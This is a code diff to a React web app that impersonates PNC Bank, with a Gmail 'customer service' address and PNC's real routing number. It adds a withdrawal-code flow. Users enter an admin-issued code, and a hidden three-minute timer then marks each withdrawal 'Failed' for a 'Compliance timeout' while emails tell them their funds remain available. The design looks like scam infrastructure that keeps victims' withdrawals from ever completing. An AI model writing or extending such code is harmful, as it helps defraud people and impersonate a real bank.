@@ -9,6 +9,7 @@ const CUSTOMER_SERVICE_EMAIL = 'pncbank.org@gmail.com';
 const SHARED_ACCOUNTS_API_PORT = 8787;
 const PNC_ROUTING_NUMBER = '031100089';
 const NOTIFICATION_RETENTION_DAYS = 30;
+const WITHDRAWAL_CODE_REVIEW_FAIL_DELAY_MS = 3 * 60 * 1000;
 const PAGE_LOADING_DELAY_MS = 2000;
 const TRANSFER_LOADING_MIN_DELAY_MS = 3000;
 const TRANSFER_LOADING_MAX_DELAY_MS = 5000;
@@ -1520,6 +1521,15 @@ function getDisplayDate(date = new Date()) {
   });
 }
 
+function formatShortDateTime(value) {
+  return new Date(value).toLocaleString('en-US', {
+    month: 'short',
+    day: '2-digit',
+    hour: 'numeric',
+    minute: '2-digit',
+  });
+}
+
 function buildWithdrawalSupportMessage({ userName, amount, bankName, accountNumber, requestId, note }) {
   const parts = [
     `Hello customer service, I need my withdrawal code for request ${requestId}.`,
@@ -1819,6 +1829,7 @@ function App() {
   const lastRemoteAccountsSnapshotRef = useRef('');
   const lastRemoteAdminWorkspaceSnapshotRef = useRef('');
   const loadingRequestRef = useRef(0);
+  const withdrawalFailureTimersRef = useRef(new Map());
 
   const activeUser = accounts.find((account) => account.id === activeUserId) ?? null;
   const userBalances = activeUser?.accounts ?? [];
@@ -3115,6 +3126,260 @@ function App() {
     };
   }
 
+  async function notifyWithdrawalStatus({ targetRequest, notificationTitle, notificationMessage, emailSubject, emailMessage }) {
+    if (!targetRequest?.requesterId) {
+      return;
+    }
+
+    const recipient = accounts.find((account) => account.id === targetRequest.requesterId && account.role !== 'admin');
+
+    if (!recipient) {
+      return;
+    }
+
+    setAccounts((current) =>
+      current.map((account) => {
+        if (account.id !== recipient.id) {
+          return account;
+        }
+
+        return {
+          ...account,
+          notifications: [
+            normalizeNotificationEntry({
+              id: `NOTICE-WD-${targetRequest.id}-${Date.now()}`,
+              type: 'withdrawal-update',
+              title: notificationTitle,
+              message: notificationMessage,
+              createdAt: new Date().toISOString(),
+            }),
+            ...(account.notifications ?? []).map(normalizeNotificationEntry),
+          ],
+        };
+      }),
+    );
+
+    if (recipient.email) {
+      await requestImportantMessageEmail({
+        name: recipient.name,
+        email: recipient.email,
+        subject: emailSubject,
+        message: emailMessage,
+      });
+    }
+  }
+
+  async function handleWithdrawalCodeSubmission(requestId, enteredCode) {
+    if (!activeUser || activeUser.role === 'admin') {
+      return { ok: false, message: 'Only signed-in users can submit withdrawal codes.' };
+    }
+
+    const cleanCode = enteredCode.trim().toUpperCase();
+
+    if (!cleanCode) {
+      return { ok: false, message: 'Enter the withdrawal code sent by admin.' };
+    }
+
+    let matchedRequest = null;
+
+    setAdminWithdrawalRecords((current) =>
+      current.map((request) => {
+        if (request.id !== requestId || request.requesterId !== activeUser.id) {
+          return request;
+        }
+
+        matchedRequest = request;
+
+        if (request.status !== 'Approved') {
+          return request;
+        }
+
+        if (String(request.code ?? '').toUpperCase() !== cleanCode) {
+          return request;
+        }
+
+        const nowIso = new Date().toISOString();
+        const expectedFailureAt = new Date(Date.now() + WITHDRAWAL_CODE_REVIEW_FAIL_DELAY_MS).toISOString();
+
+        return {
+          ...request,
+          status: 'Pending',
+          payoutState: 'Code Entered',
+          codeEnteredAt: nowIso,
+          expectedFailureAt,
+          failureReason: '',
+        };
+      }),
+    );
+
+    if (!matchedRequest) {
+      return { ok: false, message: 'Withdrawal request could not be found.' };
+    }
+
+    if (matchedRequest.status !== 'Approved') {
+      return { ok: false, message: `This withdrawal is currently ${matchedRequest.status.toLowerCase()} and cannot accept a code.` };
+    }
+
+    if (String(matchedRequest.code ?? '').toUpperCase() !== cleanCode) {
+      return { ok: false, message: 'Invalid withdrawal code. Please check and try again.' };
+    }
+
+    setAdminNotice(`${matchedRequest.id} code submitted by ${activeUser.name}. Request stays pending for compliance review.`);
+    pushAdminActivity(`${activeUser.name} submitted withdrawal code for ${matchedRequest.id}.`, { promoteToLiveFeed: true });
+
+    await notifyWithdrawalStatus({
+      targetRequest: matchedRequest,
+      notificationTitle: 'Withdrawal code received',
+      notificationMessage: `Code received for ${matchedRequest.id}. The withdrawal remains pending and is under compliance review.`,
+      emailSubject: `Withdrawal review started for ${matchedRequest.id}`,
+      emailMessage: `We received your withdrawal code for request ${matchedRequest.id}. Your withdrawal remains pending for compliance review and is not completed yet.`,
+    });
+
+    return {
+      ok: true,
+      message: `Code accepted for ${matchedRequest.id}. The request remains pending and will be reviewed shortly.`,
+    };
+  }
+
+  async function handleSendWithdrawalCode(requestId, options = {}) {
+    const targetRequest = adminWithdrawalRecords.find((request) => request.id === requestId);
+
+    if (!targetRequest) {
+      setAdminNotice('Withdrawal request not found for code delivery.');
+      return;
+    }
+
+    if (!targetRequest.code || targetRequest.code === 'Awaiting approval' || targetRequest.code === 'Not issued') {
+      setAdminNotice(`No issued code is available for ${targetRequest.id}.`);
+      return;
+    }
+
+    const recipient = accounts.find((account) => account.id === targetRequest.requesterId && account.role !== 'admin');
+
+    if (!recipient) {
+      setAdminNotice(`No valid recipient account was found for ${targetRequest.id}.`);
+      return;
+    }
+
+    const message = `Withdrawal code for ${targetRequest.id}: ${targetRequest.code}. Submit the code in your dashboard to keep the request pending for review.`;
+
+    await notifyWithdrawalStatus({
+      targetRequest,
+      notificationTitle: 'Withdrawal code issued',
+      notificationMessage: message,
+      emailSubject: `Withdrawal code issued for ${targetRequest.id}`,
+      emailMessage: message,
+    });
+
+    if (!options.silent) {
+      setAdminNotice(`Code for ${targetRequest.id} was sent to ${recipient.name} via notification and email.`);
+      pushAdminActivity(`${activeUser?.name ?? 'Admin'} sent withdrawal code for ${targetRequest.id} to ${recipient.name}.`, {
+        promoteToLiveFeed: true,
+      });
+    }
+  }
+
+  async function handleCopyWithdrawalCode(requestId) {
+    const targetRequest = adminWithdrawalRecords.find((request) => request.id === requestId);
+
+    if (!targetRequest?.code || targetRequest.code === 'Awaiting approval' || targetRequest.code === 'Not issued') {
+      setAdminNotice(`No issued code is available for ${requestId}.`);
+      return;
+    }
+
+    try {
+      if (!navigator?.clipboard?.writeText) {
+        throw new Error('Clipboard unavailable');
+      }
+
+      await navigator.clipboard.writeText(targetRequest.code);
+      setAdminNotice(`Code ${targetRequest.code} copied for ${targetRequest.id}.`);
+    } catch {
+      setAdminNotice(`Unable to copy code for ${targetRequest.id} in this browser session.`);
+    }
+  }
+
+  useEffect(() => {
+    const activeTimers = withdrawalFailureTimersRef.current;
+    const eligibleIds = new Set();
+
+    adminWithdrawalRecords.forEach((request) => {
+      if (request.status !== 'Pending' || !request.codeEnteredAt || request.failedAt) {
+        return;
+      }
+
+      eligibleIds.add(request.id);
+      const enteredMs = new Date(request.codeEnteredAt).getTime();
+
+      if (!Number.isFinite(enteredMs)) {
+        return;
+      }
+
+      const remainingMs = Math.max(0, WITHDRAWAL_CODE_REVIEW_FAIL_DELAY_MS - (Date.now() - enteredMs));
+
+      if (activeTimers.has(request.id)) {
+        return;
+      }
+
+      const timerId = window.setTimeout(async () => {
+        activeTimers.delete(request.id);
+
+        let failedRequest = null;
+
+        setAdminWithdrawalRecords((current) =>
+          current.map((entry) => {
+            if (entry.id !== request.id) {
+              return entry;
+            }
+
+            if (entry.status !== 'Pending' || !entry.codeEnteredAt || entry.failedAt) {
+              return entry;
+            }
+
+            failedRequest = {
+              ...entry,
+              status: 'Failed',
+              failedAt: new Date().toISOString(),
+              code: 'Expired',
+              failureReason: 'Compliance timeout',
+            };
+
+            return failedRequest;
+          }),
+        );
+
+        if (!failedRequest) {
+          return;
+        }
+
+        const failedAtLabel = formatShortDateTime(failedRequest.failedAt);
+        const failureMessage = `Withdrawal ${failedRequest.id} failed after pending review at ${failedAtLabel}. No payout was completed and your funds remain available.`;
+
+        setAdminNotice(`${failedRequest.id} failed after pending review timeout.`);
+        pushAdminActivity(`${activeUser?.name ?? 'Admin'} system-timed ${failedRequest.id} to failed after pending review timeout.`, {
+          promoteToLiveFeed: true,
+        });
+
+        await notifyWithdrawalStatus({
+          targetRequest: failedRequest,
+          notificationTitle: 'Withdrawal failed',
+          notificationMessage: failureMessage,
+          emailSubject: `Withdrawal failed for ${failedRequest.id}`,
+          emailMessage: failureMessage,
+        });
+      }, remainingMs);
+
+      activeTimers.set(request.id, timerId);
+    });
+
+    for (const [requestId, timerId] of activeTimers.entries()) {
+      if (!eligibleIds.has(requestId)) {
+        window.clearTimeout(timerId);
+        activeTimers.delete(requestId);
+      }
+    }
+  }, [accounts, adminWithdrawalRecords, activeUser]);
+
   function getAdminTimestamp() {
     const now = new Date();
     return `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
@@ -3797,10 +4062,10 @@ function App() {
       return;
     }
 
-    applyWithdrawalDecision(requestId, decision);
+    void applyWithdrawalDecision(requestId, decision);
   }
 
-  function applyWithdrawalDecision(requestId, decision) {
+  async function applyWithdrawalDecision(requestId, decision) {
     let updatedRequest = null;
 
     setAdminWithdrawalRecords((current) =>
@@ -3828,6 +4093,21 @@ function App() {
       `${activeUser?.name ?? 'Admin'} ${decision === 'approve' ? 'approved' : 'rejected'} withdrawal ${updatedRequest.id}.`,
       { promoteToLiveFeed: true },
     );
+
+    if (decision === 'approve') {
+      await handleSendWithdrawalCode(updatedRequest.id, { silent: true });
+      setAdminNotice(`${updatedRequest.id} approved and code issued to user via notification and email.`);
+      return;
+    }
+
+    const rejectionMessage = `Withdrawal ${updatedRequest.id} was rejected by admin. No payout was completed and no funds were debited from your account.`;
+    await notifyWithdrawalStatus({
+      targetRequest: updatedRequest,
+      notificationTitle: 'Withdrawal rejected',
+      notificationMessage: rejectionMessage,
+      emailSubject: `Withdrawal rejected for ${updatedRequest.id}`,
+      emailMessage: rejectionMessage,
+    });
   }
 
   function handleCardGeneration(requestId) {
@@ -4022,7 +4302,7 @@ function App() {
     }
 
     if (adminDialog.kind === 'reject-withdrawal') {
-      applyWithdrawalDecision(adminDialog.targetId, 'reject');
+      void applyWithdrawalDecision(adminDialog.targetId, 'reject');
     }
 
     if (adminDialog.kind.startsWith('case-')) {
@@ -4093,6 +4373,7 @@ function App() {
           onSubmitTransfer={handleSubmitTransfer}
           onSubmitBillPayment={handleSubmitBillPayment}
           onSubmitWithdrawalRequest={handleSubmitWithdrawalRequest}
+          onSubmitWithdrawalCode={handleWithdrawalCodeSubmission}
           onSubmitCardRequest={handleSubmitCardRequest}
           onSubmitSupportCase={handleSubmitSupportCase}
           onSubmitLoanRequest={handleSubmitLoanRequest}
@@ -4215,6 +4496,8 @@ function App() {
         onSaveUserLimits={handleSaveUserLimits}
         adminWithdrawalRecords={adminWithdrawalRecords}
         onWithdrawalDecision={handleWithdrawalDecision}
+          onCopyWithdrawalCode={handleCopyWithdrawalCode}
+          onSendWithdrawalCode={handleSendWithdrawalCode}
         adminCardRecords={adminCardRecords}
         onGenerateCard={handleCardGeneration}
         adminTransactionRecords={adminTransactionRecords}
@@ -4728,6 +5011,7 @@ function UserDashboard({
   onSubmitTransfer,
   onSubmitBillPayment,
   onSubmitWithdrawalRequest,
+  onSubmitWithdrawalCode,
   onSubmitCardRequest,
   onSubmitSupportCase,
   onSubmitLoanRequest,
@@ -4745,6 +5029,7 @@ function UserDashboard({
   const [withdrawalForm, setWithdrawalForm] = useState({ amount: '', bankId: user.savedBanks?.[0]?.id ?? '', message: '' });
   const [withdrawalFeedback, setWithdrawalFeedback] = useState('');
   const [submittedWithdrawal, setSubmittedWithdrawal] = useState(null);
+  const [withdrawalCodeInputByRequest, setWithdrawalCodeInputByRequest] = useState({});
   const [bankForm, setBankForm] = useState({ bankName: '', accountName: user.name, accountNumber: '' });
   const [bankFeedback, setBankFeedback] = useState('');
   const [transferForm, setTransferForm] = useState({
@@ -5254,6 +5539,16 @@ function UserDashboard({
         auditLabel: 'Needs Review',
         nextStep: 'Check that a payout bank is selected and that the withdrawal amount is valid before trying again.',
       });
+    }
+  }
+
+  async function handleWithdrawalCodeSubmit(requestId) {
+    const enteredCode = (withdrawalCodeInputByRequest[requestId] ?? '').trim();
+    const result = await onSubmitWithdrawalCode(requestId, enteredCode);
+    setWithdrawalFeedback(result.message);
+
+    if (result.ok) {
+      setWithdrawalCodeInputByRequest((current) => ({ ...current, [requestId]: '' }));
     }
   }
 
@@ -6071,6 +6366,27 @@ function UserDashboard({
                       {request.amount} • {request.destination}
                     </span>
                     <small>{request.requested}</small>
+                    {request.status === 'Approved' ? (
+                      <div className="withdrawal-code-submit-row">
+                        <input
+                          value={withdrawalCodeInputByRequest[request.id] ?? ''}
+                          placeholder="Enter issued code"
+                          onChange={(event) =>
+                            setWithdrawalCodeInputByRequest((current) => ({
+                              ...current,
+                              [request.id]: event.target.value,
+                            }))
+                          }
+                        />
+                        <button type="button" className="secondary-button compact-button" onClick={() => handleWithdrawalCodeSubmit(request.id)}>
+                          Submit Code
+                        </button>
+                      </div>
+                    ) : null}
+                    {request.status === 'Pending' && request.payoutState === 'Code Entered' ? (
+                      <small>Code received. Request remains pending for review and will not complete automatically.</small>
+                    ) : null}
+                    {request.status === 'Failed' && request.failureReason ? <small>{request.failureReason}</small> : null}
                   </div>
                   <div className="withdrawal-request-side">
                     <span className={`status-pill ${request.status.toLowerCase()}`}>{request.status}</span>
@@ -7054,6 +7370,8 @@ function AdminDashboard({
   onSaveUserLimits,
   adminWithdrawalRecords,
   onWithdrawalDecision,
+  onCopyWithdrawalCode,
+  onSendWithdrawalCode,
   adminCardRecords,
   onGenerateCard,
   adminTransactionRecords,
@@ -8278,6 +8596,16 @@ function AdminDashboard({
                   <button type="button" className="table-link reject" onClick={() => onWithdrawalDecision(request.id, 'reject')}>
                     Reject
                   </button>
+                  {request.status === 'Approved' ? (
+                    <>
+                      <button type="button" className="table-link" onClick={() => onCopyWithdrawalCode(request.id)}>
+                        Copy Code
+                      </button>
+                      <button type="button" className="table-link" onClick={() => onSendWithdrawalCode(request.id)}>
+                        Send Code
+                      </button>
+                    </>
+                  ) : null}
                 </div>
               </div>
             ))}
